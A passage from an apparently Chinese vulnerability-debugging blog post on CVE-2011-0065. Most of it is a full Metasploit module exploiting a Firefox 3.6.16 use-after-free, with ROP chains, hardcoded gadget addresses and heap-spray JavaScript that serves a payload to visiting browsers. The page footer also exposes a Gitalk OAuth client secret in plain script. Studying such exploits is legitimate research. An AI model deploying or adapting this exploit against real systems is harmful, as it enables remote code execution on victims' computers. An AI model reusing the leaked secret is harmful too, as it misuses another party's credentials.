class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># This module requires Metasploit: http://metasploit.com/download</span><br><span class="line"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">require 'msf/core'</span><br><span class="line"></span><br><span class="line">class MetasploitModule &lt; Msf::Exploit::Remote</span><br><span class="line">  Rank = NormalRanking</span><br><span class="line"></span><br><span class="line">  include Msf::Exploit::Remote::HttpServer::HTML</span><br><span class="line">  #include Msf::Exploit::Remote::BrowserAutopwn</span><br><span class="line">  #autopwn_info(&#123;</span><br><span class="line">  #  :ua_name =&gt; HttpClients::FF,</span><br><span class="line">  #  :ua_minver =&gt; "3.6.16",</span><br><span class="line">  #  :ua_maxver =&gt; "3.6.16",</span><br><span class="line">  #  :os_name =&gt; OperatingSystems::Match::WINDOWS,</span><br><span class="line">  #  :javascript =&gt; true,</span><br><span class="line">  #  :rank =&gt; NormalRanking,</span><br><span class="line">  #&#125;)</span><br><span class="line"></span><br><span class="line">  def initialize(info = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">      'Name'           =&gt; 'Mozilla Firefox 3.6.16 mChannel Use-After-Free Vulnerability',</span><br><span class="line">      'Description'    =&gt; %q&#123;</span><br><span class="line">          This module exploits an use after free vulnerability in Mozilla</span><br><span class="line">        Firefox 3.6.16. An OBJECT Element mChannel can be freed via the</span><br><span class="line">        OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel</span><br><span class="line">        becomes a dangling pointer and can be reused when setting the OBJECTs</span><br><span class="line">        data attribute. (Discovered by regenrecht). This module uses heapspray</span><br><span class="line">        with a minimal ROP chain to bypass DEP on Windows XP SP3. Additionlay,</span><br><span class="line">        a windows 7 target was provided using JAVA 6 and below to avoid aslr.</span><br><span class="line">      &#125;,</span><br><span class="line">      'License'        =&gt; MSF_LICENSE,</span><br><span class="line">      'Author'         =&gt;</span><br><span class="line">        [</span><br><span class="line">          'regenrecht',  # discovery</span><br><span class="line">          'Rh0',         # metasploit module</span><br><span class="line">          'mr_me &lt;steventhomasseeley[at]gmail.com&gt;' # win7 target</span><br><span class="line">        ],</span><br><span class="line">      'References'     =&gt;</span><br><span class="line">        [</span><br><span class="line">          ['CVE',    '2011-0065'],</span><br><span class="line">          ['OSVDB',  '72085'],</span><br><span class="line">          ['URL',    'https://bugzilla.mozilla.org/show_bug.cgi?id=634986'],</span><br><span class="line">          ['URL',    'http://www.mozilla.org/security/announce/2011/mfsa2011-13.html']</span><br><span class="line">        ],</span><br><span class="line">      'DefaultOptions' =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          'EXITFUNC' =&gt; 'process',</span><br><span class="line">          'InitialAutoRunScript' =&gt; 'migrate -f',</span><br><span class="line">        &#125;,</span><br><span class="line">      'Payload'        =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          'Space' =&gt; 1024,</span><br><span class="line">        &#125;,</span><br><span class="line">      'Platform'       =&gt; 'win',</span><br><span class="line">      'Targets'        =&gt;</span><br><span class="line">        [</span><br><span class="line"></span><br><span class="line">          [ 'Automatic', &#123; &#125; ],</span><br><span class="line"></span><br><span class="line">          # DEP bypass</span><br><span class="line">          [</span><br><span class="line">            'Firefox 3.6.16 on Windows XP SP3',</span><br><span class="line">            &#123;</span><br><span class="line">              'Arch' =&gt; ARCH_X86,</span><br><span class="line">              'Fakevtable' =&gt; 0x0c00,   //站位虚函数表地址</span><br><span class="line">              'Fakefunc' =&gt; 0x0c00001c,</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line"></span><br><span class="line">          # requires JAVA &lt;= JAVA 6 update 26</span><br><span class="line">          # cop stack pivot = ASLR/DEP bypass</span><br><span class="line">          [</span><br><span class="line">            'Firefox 3.6.16 on Windows 7 + Java',</span><br><span class="line">            &#123;</span><br><span class="line">              'Arch' =&gt; ARCH_X86,</span><br><span class="line">              'Fakevtable' =&gt; 0x1000,</span><br><span class="line">              'Fakefunc' =&gt; 0x100002a4,</span><br><span class="line">              'Ppppr' =&gt; 0x7c3410c0,</span><br><span class="line">              'Retn' =&gt; 0x7c3410c4,</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        ],</span><br><span class="line">      'DefaultTarget'  =&gt; 0,</span><br><span class="line">      'DisclosureDate' =&gt; 'May 10 2011'</span><br><span class="line">      ))</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def junk</span><br><span class="line">    return rand_text_alpha(4).unpack("L")[0].to_i</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def on_request_uri(cli, request)</span><br><span class="line"></span><br><span class="line">    # Random JavaScript variable names</span><br><span class="line">    js_element_name      = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_obj_addr_name     = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_sc_name           = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_ret_addr_name     = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_chunk_name        = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_final_chunk_name  = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_block_name        = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_array_name        = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_retns             = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_applet_name       = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_ppppr             = rand_text_alpha(rand(10) + 5)</span><br><span class="line">    js_filler            = rand_text_alpha(rand(10) + 5)</span><br><span class="line"></span><br><span class="line">    agent = request.headers['User-Agent']</span><br><span class="line"></span><br><span class="line">    # Set target manually or automatically</span><br><span class="line">    my_target = target</span><br><span class="line">    if my_target.name == 'Automatic'</span><br><span class="line">      if agent =~ /NT 5\.1/ and agent =~ /Firefox\/3\.6\.16/</span><br><span class="line">        my_target = targets[1]</span><br><span class="line">      elsif agent =~ /NT 6\.1/ and agent =~ /Firefox\/3\.6\.16/</span><br><span class="line">        my_target = targets[2]</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    # check for non vulnerable targets</span><br><span class="line">    if agent !~ /NT 5\.1/ or agent !~ /NT 6\.1/ and agent !~ /Firefox\/3\.6\.16/</span><br><span class="line">      print_error("Target not supported: #&#123;agent&#125;")</span><br><span class="line">      send_not_found(cli)</span><br><span class="line">      return</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    # Re-generate the payload</span><br><span class="line">    return if ((p = regenerate_payload(cli).encoded) == nil)</span><br><span class="line"></span><br><span class="line">    if my_target.name =~ /Windows 7/ and not request.uri =~ /\.html/</span><br><span class="line"></span><br><span class="line">      html_trigger = ""</span><br><span class="line">      if ("/" == get_resource[-1,1])</span><br><span class="line">        html_trigger = get_resource[0, get_resource.length - 1]</span><br><span class="line">      else</span><br><span class="line">        html_trigger = get_resource</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      custom_js = &lt;&lt;-JS</span><br><span class="line">      function forward() &#123;</span><br><span class="line">        window.location = window.location + "#&#123;html_trigger&#125;.html";</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      function start() &#123;</span><br><span class="line">        setTimeout("forward()", 3500);</span><br><span class="line">      &#125;</span><br><span class="line">      start();</span><br><span class="line">      JS</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line">      if my_target.name =~ /Windows XP/</span><br><span class="line"></span><br><span class="line">        # DEP bypass using xul.dll</span><br><span class="line">        rop_gadgets = [</span><br><span class="line">          0x1052c871,  # mov esp,[ecx] / mov edx,5c86c6ff / add [eax],eax / xor eax,eax / pop esi / retn 0x8 [xul.dll]</span><br><span class="line">          junk,        # junk --------------------------------------------------------------^^</span><br><span class="line">          0x7c801ad4,  # VirtualProtect</span><br><span class="line">          junk,        # junk -------------------------------------------------------------------------^^</span><br><span class="line">          junk,        # junk -------------------------------------------------------------------------^^</span><br><span class="line">          0x1003876B,  # jmp esp</span><br><span class="line">          0x0c000040,  # start address</span><br><span class="line">          0x00000400,  # size 1024</span><br><span class="line">          0x00000040,  # Page EXECUTE_READ_WRITE</span><br><span class="line">          0x0c0c0c00,  # old protection</span><br><span class="line">        ].pack("V*")</span><br><span class="line"></span><br><span class="line">        rop = rop_gadgets</span><br><span class="line"></span><br><span class="line">      elsif my_target.name =~ /Windows 7/ and request.uri =~ /\.html/</span><br><span class="line"></span><br><span class="line">        # 5 gadgets to pivot using call oriented programming (cop)</span><br><span class="line">        # these instructions are taken from: java.dll, zip.dll and MSVCR71.dll (non aslr)</span><br><span class="line">        # 1. MOV EDX,DWORD PTR DS:[ECX] / junk / junk / junk / PUSH ECX / CALL [EDX+28C]</span><br><span class="line">        # 2. PUSH EAX / PUSH EBX / PUSH ESI / CALL [ECX+1C0]</span><br><span class="line">        # 3. PUSH EBP / MOV EBP,ESP / MOV EAX,[EBP+18] / PUSH 1C / PUSH 1 / PUSH [EAX+28] / CALL [EAX+20]</span><br><span class="line">        # 4. CALL [EAX+24] / POP ECX / POP ECX / RETN (neatly place address onto the stack)</span><br><span class="line">        # 5. ADD EAX,4 / TEST [EAX],EAX / XCHG EAX,ESP / MOV EAX,[EAX] / PUSH EAX / RETN</span><br><span class="line"></span><br><span class="line">        rop_pivot = [</span><br><span class="line">          0x6D32280C,  # 1. MOV EDX,DWORD PTR DS:[ECX] / junk / junk / junk / PUSH ECX / CALL [EDX+28C]</span><br><span class="line">          junk,        # filler</span><br><span class="line">          0x6D7E627D,  # 4. CALL [EAX+24] / POP ECX / POP ECX / RETN (neatly place address onto the stack)</span><br><span class="line">          0x7C3413A4,  # 5. ADD EAX,4 / TEST [EAX],EAX / XCHG EAX,ESP / MOV EAX,[EAX] / PUSH EAX / RETN</span><br><span class="line">        ].pack("V*")</span><br><span class="line"></span><br><span class="line">        # 319</span><br><span class="line"></span><br><span class="line">        # rop nops - RETN</span><br><span class="line">        rop_pivot &lt;&lt; [0x7c3410c4].pack("V*") * 0x65 #(0xca-0x65)</span><br><span class="line"></span><br><span class="line">        # POP r32 / RETN</span><br><span class="line">        rop_pivot &lt;&lt; [0x7c3410c3].pack("V*")</span><br><span class="line"></span><br><span class="line">        # 3. PUSH EBP / MOV EBP,ESP / MOV EAX,[EBP+18] / PUSH 1C / PUSH 1 / PUSH [EAX+28] / CALL [EAX+20]</span><br><span class="line">        rop_pivot &lt;&lt; [0x6D7E5CDA].pack("V*")</span><br><span class="line"></span><br><span class="line">        # rop nops - RETN</span><br><span class="line">        rop_pivot &lt;&lt; [0x7c3410c4].pack("V*") * 0xda # (0x75+0x65)</span><br><span class="line"></span><br><span class="line">        # POP r32 / RETN</span><br><span class="line">        rop_pivot &lt;&lt; [0x7c3410c3].pack("V*")</span><br><span class="line"></span><br><span class="line">        # 2. PUSH EAX / PUSH EBX / PUSH ESI / CALL [ECX+1C0]</span><br><span class="line">        rop_pivot &lt;&lt; [0x6D325BFC].pack("V*")</span><br><span class="line"></span><br><span class="line">        # https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/ &lt;MSVCR71.dll&gt;</span><br><span class="line">        rop_gadgets = [</span><br><span class="line">          0x7c346c0a,  # POP EAX / RETN</span><br><span class="line">          0x7c37a140,  # Make EAX readable</span><br><span class="line">          0x7c37591f,  # PUSH ESP / ... / POP ECX / POP EBP / RETN</span><br><span class="line">          junk,        # EBP (filler)</span><br><span class="line">          0x7c346c0a,  # POP EAX / RETN</span><br><span class="line">          0x7c37a140,  # *&amp;VirtualProtect()</span><br><span class="line">          0x7c3530ea,  # MOV EAX,[EAX] / RETN</span><br><span class="line">          0x7c346c0b,  # Slide, so next gadget would write to correct stack location</span><br><span class="line">          0x7c376069,  # MOV [ECX+1C],EAX / POP EDI / POP ESI / POP EBX / RETN</span><br><span class="line">          junk,        # EDI (filler)</span><br><span class="line">          junk,        # will be patched at runtime (VP), then picked up into ESI</span><br><span class="line">          junk,        # EBX (filler)</span><br><span class="line">          0x7c376402,  # POP EBP / RETN</span><br><span class="line">          0x7c345c30,  # ptr to 'push esp /  ret'</span><br><span class="line">          0x7c346c0a,  # POP EAX / RETN</span><br><span class="line">          0xfffffdff,  # size 0x00000201 -&gt; ebx</span><br><span class="line">          0x7c351e05,  # NEG EAX / RETN</span><br><span class="line">          0x7c354901,  # POP EBX / RETN</span><br><span class="line">          0xffffffff,  # pop value into ebx</span><br><span class="line">          0x7c345255,  # INC EBX / FPATAN / RETN</span><br><span class="line">          0x7c352174,  # ADD EBX,EAX / XOR EAX,EAX / INC EAX / RETN</span><br><span class="line">          0x7c34d201,  # POP ECX / RETN</span><br><span class="line">          0x7c38b001,  # RW pointer (lpOldProtect) (-&gt; ecx)</span><br><span class="line">          0x7c34b8d7,  # POP EDI / RETN</span><br><span class="line">          0x7c34b8d8,  # ROP NOP (-&gt; edi)</span><br><span class="line">          0x7c344f87,  # POP EDX / RETN</span><br><span class="line">          0xffffffc0,  # value to negate, target value : 0x00000040, target: edx</span><br><span class="line">          0x7c351eb1,  # NEG EDX / RETN</span><br><span class="line">          0x7c346c0a,  # POP EAX / RETN</span><br><span class="line">          0x90909090,  # NOPS (-&gt; eax)</span><br><span class="line">          0x7c378c81,  # PUSHAD / ADD AL,0EF / RETN</span><br><span class="line">          0x90909090,  # NOPS (-&gt; eax)</span><br><span class="line">        ].pack("V*")</span><br><span class="line"></span><br><span class="line">        rop = rop_pivot + rop_gadgets</span><br><span class="line"></span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      payload_buf  = ''</span><br><span class="line">      payload_buf &lt;&lt; rop</span><br><span class="line">      payload_buf &lt;&lt; p</span><br><span class="line">      escaped_payload = Rex::Text.to_unescape(payload_buf)</span><br><span class="line"></span><br><span class="line">      # setup the fake memory references</span><br><span class="line">      fakevtable = Rex::Text.to_unescape([my_target['Fakevtable']].pack('v'))</span><br><span class="line">      fakefunc = Rex::Text.to_unescape([my_target['Fakefunc']].pack('V*'))</span><br><span class="line"></span><br><span class="line">      if my_target.name =~ /Windows XP/</span><br><span class="line"></span><br><span class="line">        # fast loading JS so we dont get the 'unresponsive script' warning from ff</span><br><span class="line">        custom_js = &lt;&lt;-JS</span><br><span class="line">        #&#123;js_element_name&#125; = document.getElementById("d");</span><br><span class="line">        #&#123;js_element_name&#125;.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)</span><br><span class="line"></span><br><span class="line">        #&#123;js_obj_addr_name&#125; = unescape("\x00#&#123;fakevtable&#125;");</span><br><span class="line">        var #&#123;js_sc_name&#125; = unescape("#&#123;escaped_payload&#125;");</span><br><span class="line"></span><br><span class="line">        var #&#123;js_ret_addr_name&#125; = unescape("#&#123;fakefunc&#125;");</span><br><span class="line">        while(#&#123;js_ret_addr_name&#125;.length &lt; 0x80) &#123;#&#123;js_ret_addr_name&#125; += #&#123;js_ret_addr_name&#125;;&#125;</span><br><span class="line">        var #&#123;js_chunk_name&#125; = #&#123;js_ret_addr_name&#125;.substring(0,0x18/2);</span><br><span class="line">        #&#123;js_chunk_name&#125; += #&#123;js_sc_name&#125;;</span><br><span class="line">        #&#123;js_chunk_name&#125; += #&#123;js_ret_addr_name&#125;;</span><br><span class="line">        var #&#123;js_final_chunk_name&#125; = #&#123;js_chunk_name&#125;.substring(0,0x10000/2);</span><br><span class="line">        while (#&#123;js_final_chunk_name&#125;.length&lt;0x800000) &#123;#&#123;js_final_chunk_name&#125; += #&#123;js_final_chunk_name&#125;;&#125;</span><br><span class="line">        var #&#123;js_block_name&#125; = #&#123;js_final_chunk_name&#125;.substring(0,0x80000 - #&#123;js_sc_name&#125;.length - 0x24/2 - 0x4/2 - 0x2/2);</span><br><span class="line">        #&#123;js_array_name&#125; = new Array()</span><br><span class="line">        for (n=0;n&lt;0x80;n++)&#123;</span><br><span class="line">          #&#123;js_array_name&#125;[n] = #&#123;js_block_name&#125; + #&#123;js_sc_name&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        JS</span><br><span class="line">      elsif my_target.name =~ /Windows 7/</span><br><span class="line"></span><br><span class="line">        # setup precision heap spray</span><br><span class="line">        ppppr = Rex::Text.to_unescape([my_target['Ppppr']].pack('V*'))</span><br><span class="line">        retns = Rex::Text.to_unescape([my_target['Retn']].pack('V*'))</span><br><span class="line"></span><br><span class="line">        # fast loading JS so we dont get the 'unresponsive script' warning from ff</span><br><span class="line">        # precision heap spray</span><br><span class="line">        custom_js = &lt;&lt;-JS</span><br><span class="line">        #&#123;js_element_name&#125; = document.getElementById("d");</span><br><span class="line">        #&#123;js_element_name&#125;.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)</span><br><span class="line"></span><br><span class="line">        #&#123;js_obj_addr_name&#125; = unescape("\x00#&#123;fakevtable&#125;");</span><br><span class="line">        var #&#123;js_sc_name&#125; = unescape("#&#123;escaped_payload&#125;");</span><br><span class="line"></span><br><span class="line">        var #&#123;js_ret_addr_name&#125; = unescape("#&#123;fakefunc&#125;");</span><br><span class="line">        var #&#123;js_retns&#125; = unescape("#&#123;retns&#125;");</span><br><span class="line"></span><br><span class="line">        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;</span><br><span class="line">        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;</span><br><span class="line">        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;</span><br><span class="line">        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;</span><br><span class="line"></span><br><span class="line">        var #&#123;js_ppppr&#125; = unescape("#&#123;ppppr&#125;");</span><br><span class="line">        #&#123;js_ret_addr_name&#125; += #&#123;js_ppppr&#125;;</span><br><span class="line"></span><br><span class="line">        var #&#123;js_filler&#125; = unescape("%u4344%u4142");</span><br><span class="line">        while(#&#123;js_filler&#125;.length &lt; 0x201) &#123;#&#123;js_filler&#125; += #&#123;js_filler&#125;;&#125;</span><br><span class="line"></span><br><span class="line">        while(#&#123;js_ret_addr_name&#125;.length &lt; 0x80) &#123;#&#123;js_ret_addr_name&#125; += #&#123;js_ret_addr_name&#125;;&#125;</span><br><span class="line"></span><br><span class="line">        var #&#123;js_chunk_name&#125; = #&#123;js_ret_addr_name&#125;.substring(0,0x18/2);</span><br><span class="line"></span><br><span class="line">        #&#123;js_chunk_name&#125; += #&#123;js_sc_name&#125;;</span><br><span class="line">        #&#123;js_chunk_name&#125; += #&#123;js_filler&#125;;</span><br><span class="line">        #&#123;js_chunk_name&#125; += #&#123;js_ret_addr_name&#125;;</span><br><span class="line"></span><br><span class="line">        var #&#123;js_final_chunk_name&#125; = #&#123;js_chunk_name&#125;.substring(0,0x10000/2);</span><br><span class="line">        while (#&#123;js_final_chunk_name&#125;.length&lt;0x800000) &#123;#&#123;js_final_chunk_name&#125; += #&#123;js_final_chunk_name&#125;;&#125;</span><br><span class="line">        var #&#123;js_block_name&#125; = #&#123;js_final_chunk_name&#125;.substring(0,0x80000 - #&#123;js_sc_name&#125;.length - 0x24/2 - 0x4/2 - 0x2/2);</span><br><span class="line">        #&#123;js_array_name&#125; = new Array()</span><br><span class="line">        for (n=0;n&lt;0x80;n++)&#123;</span><br><span class="line">          #&#123;js_array_name&#125;[n] = #&#123;js_block_name&#125; + #&#123;js_sc_name&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        JS</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    html = &lt;&lt;-HTML</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">      &lt;object id="d"&gt;&lt;object&gt;</span><br><span class="line">      &lt;applet code="#&#123;js_applet_name&#125;.class" width=0 height=0&gt;&lt;/applet&gt;</span><br><span class="line">      &lt;script type="text/javascript"&gt;</span><br><span class="line">      #&#123;custom_js&#125;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line">    HTML</span><br><span class="line"></span><br><span class="line">    #Remove the extra tabs</span><br><span class="line">    html = html.gsub(/^ &#123;4&#125;/, '')</span><br><span class="line">    print_status("Sending HTML...")</span><br><span class="line">    print_status(html)</span><br><span class="line">    send_response_html(cli, html, &#123; 'Content-Type' =&gt; 'text/html' &#125;)</span><br><span class="line"></span><br><span class="line">    # Handle the payload</span><br><span class="line">    handler(cli)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer>
      

        
          <div class="alignleft post-nav">
            <em>上一篇: </em><a href="/2016/08/25/Learning/Linux-malware-billgates-XORDDOS-analyze-first-time/">Linux木马分析初体验（BillGates及XORDDOS查杀）</a>
          </div>
        
        
          <div class="alignright post-nav">
            <em>下一篇: </em><a href="/2016/05/23/Debug/debug-vulner-stackoverflows-2012-0158/">漏洞调试-栈溢出漏洞-cve-2012-0158</a>
          </div>
          <div class="clearfix"></div>
        

        
          <div class="copyright">
            
              <span class="claim">转载请注明youngroe.com</span>
            
            
              <span class="from-link">
                <em>本文链接地址:</em>
                <a href="/2016/07/27/Debug/debug-vulner-UAF-2011-0065/">
                  http://www.youngroe.com/2016/07/27/Debug/debug-vulner-UAF-2011-0065/
                </a>
              </span>
            
          </div>
        
        
  
  <div class="categories">
    <a href="/categories/Debug/">Debug</a>
  </div>

        
  
  <div class="tags">
    <a href="/tags/UAF漏洞/">UAF漏洞</a>, <a href="/tags/漏洞调试/">漏洞调试</a>
  </div>

        
          <! -- 添加捐赠图标 -->
<div class ="post-donate">
    <div id="donate_board" class="donate_bar center">
        <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏"></a>
        <span class="donate_txt">
           ↑<br>
           欣赏此文？求鼓励，求支持！
        </span>
        <br>
      </div>  
    <div id="donate_guide" class="donate_bar center hidden" >
        <!-- 方式一： 
            ![](/img/Alipay.jpg)
            ![](/img/WeChatpay.jpg)
        -->
        <!-- 方式二；
            step1：在_config.yml中添加配置
                Alipay: /img/Alipay.jpg
                WeChatpay: /img/WeChatpay.jpg
            step2：此处两张图片的路径分别设置为如下
                <img src="undefined"
                <img src="undefined"
        -->
        <!-- 支付宝打赏图案 -->
        <img src="/img/Alipay.png" alt="支付宝打赏">
        <!-- 微信打赏图案 -->
        <img src="/img/WeChatpay.png" alt="微信打赏">
    </div>
    <script type="text/javascript">
        document.getElementById('btn_donate').onclick = function(){
            $('#donate_board').addClass('hidden');
            $('#donate_guide').removeClass('hidden');
        }
    </script>
</div>
<! -- 添加捐赠图标 -->
        
        <div id="gitalk-container"></div>
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
  clientID: '503c39aa3fb2b8c1b734',
  clientSecret: '65d784ff7a95a9dbf4a4208c9e32166ca29654f2',
  repo: 'geemion.github.io',
  owner: 'geemion',
  admin: 'geemion',
  pagerDirection:'first',
  id: md5(window.location.pathname)
})

gitalk.render('gitalk-container')
</script>
      
      <div class="clearfix"></div>
    </footer>
  </div>
  <div id="container"></div>
</span>
</article>


<section id="comment">
</section>

</div></div>
    <aside id="sidebar" class="alignright">
  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/Cybersecurity/">Cybersecurity</a><small>6</small></li>
  
    <li><a href="/categories/Debug/">Debug</a><small>7</small></li>
  
    <li><a href="/categories/IOT/">IOT</a><small>11</small></li>
  
    <li><a href="/categories/Kernel/">Kernel</a><small>4</small></li>
  
    <li><a href="/categories/Learning/">Learning</a><small>5</small></li>
  
    <li><a href="/categories/Life/">Life</a><small>5</small></li>
  
    <li><a href="/categories/Others/">Others</a><small>1</small></li>
  
    <li><a href="/categories/Tools/">Tools</a><small>5</small></li>
  
    <li><a href="/categories/Vulnerabilities/">Vulnerabilities</a><small>0</small></li>
  
    <li><a href="/categories/Windows/">Windows</a><small>13</small></li>
  
    <li><a href="/categories/life/">life</a><small>0</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">最新文章</h3>
  <ul class="entry">
    
      <li>
        <a href="/2021/10/20/IOT/using-rasberrypi-as-poor-mans-hardware-hacking-tool/">树莓派-穷人的硬件黑客工具（翻译）</a>
      </li>
    
      <li>
        <a href="/2021/09/23/IOT/iot-security-part-9-introduction-to-software-defined-radio/">物联网安全101-9.软件无线电简介（Software Defined Radio，SDR）:软件部分（翻译）</a>
      </li>
    
      <li>
        <a href="/2021/09/23/IOT/iot-security-part-8-introduction-to-software-defined-radio-sdr/">物联网安全101-8.软件无线电（Software Defined Radio，SDR）简介（翻译）</a>
      </li>
    
      <li>
        <a href="/2021/09/23/IOT/iot-security-part-7-reverse-engineering-an-iot-firmware/">物联网安全101-7.物联网固件逆向（翻译）</a>
      </li>
    
      <li>
        <a href="/2021/09/22/IOT/iot-security-part-5-101-zigbee-protocol-101/">物联网安全101-5.ZigBee协议（翻译）</a>
      </li>
    
      <li>
        <a href="/2021/09/22/IOT/iot-security-part-6-101-zigbee-security-101/">物联网安全101-6.ZigBee安全（翻译）</a>
      </li>
    
      <li>
        <a href="/2021/09/22/IOT/iot-security-part-4-101-bluetooth-low-energy-101/">物联网安全101-4.低功耗蓝牙BLE（翻译）</a>
      </li>
    
      <li>
        <a href="/2021/09/22/IOT/iot-security-part-3-101-iot-top-ten-vulnerabilities/">物联网安全101-3.物联网10大安全漏洞（翻译）</a>
      </li>
    
      <li>
        <a href="/2021/09/21/IOT/iot-security-part-2-101-iot-attack-surface/">物联网安全101-2.物联网攻击面（翻译）</a>
      </li>
    
      <li>
        <a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全101-1.物联网介绍及其架构（翻译）</a>
      </li>
    
      <li>
        <a href="/2021/08/20/Cybersecurity/guide-linux-privilege-escalation/">Linux权限提升指南（翻译）</a>
      </li>
    
      <li>
        <a href="/2021/03/20/IOT/powerpc_binary_blob_firmware_reverse/">一次嵌入式固件逆向实践</a>
      </li>
    
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/Boost/" style="font-size: 10px;">Boost</a> <a href="/tags/DDoS/" style="font-size: 10px;">DDoS</a> <a href="/tags/DNS-over-HTTPS/" style="font-size: 10px;">DNS-over-HTTPS</a> <a href="/tags/DNS劫持/" style="font-size: 10px;">DNS劫持</a> <a href="/tags/Delphi/" style="font-size: 10px;">Delphi</a> <a href="/tags/Dll劫持/" style="font-size: 10px;">Dll劫持</a> <a href="/tags/GetVersionEx/" style="font-size: 10px;">GetVersionEx</a> <a href="/tags/Http/" style="font-size: 10px;">Http</a> <a href="/tags/IDA-Pro/" style="font-size: 12px;">IDA Pro</a> <a href="/tags/IOT安全/" style="font-size: 18px;">IOT安全</a> <a href="/tags/Linux/" style="font-size: 14px;">Linux</a> <a href="/tags/MSDN/" style="font-size: 12px;">MSDN</a> <a href="/tags/Malware/" style="font-size: 12px;">Malware</a> <a href="/tags/MiniDumpWriteDump/" style="font-size: 10px;">MiniDumpWriteDump</a> <a href="/tags/PEB/" style="font-size: 10px;">PEB</a> <a href="/tags/Procmon/" style="font-size: 10px;">Procmon</a> <a href="/tags/Runtime-Error/" style="font-size: 10px;">Runtime Error</a> <a href="/tags/SEH/" style="font-size: 10px;">SEH</a> <a href="/tags/SysinternalsSuite/" style="font-size: 10px;">SysinternalsSuite</a> <a href="/tags/Tips/" style="font-size: 10px;">Tips</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/UAF漏洞/" style="font-size: 10px;">UAF漏洞</a> <a href="/tags/VC/" style="font-size: 10px;">VC</a> <a href="/tags/Visual-Studio/" style="font-size: 12px;">Visual Studio</a> <a href="/tags/Windbg/" style="font-size: 10px;">Windbg</a> <a href="/tags/Windows/" style="font-size: 20px;">Windows</a> <a href="/tags/getaddrinfo/" style="font-size: 10px;">getaddrinfo</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/libeay32/" style="font-size: 10px;">libeay32</a> <a href="/tags/x64/" 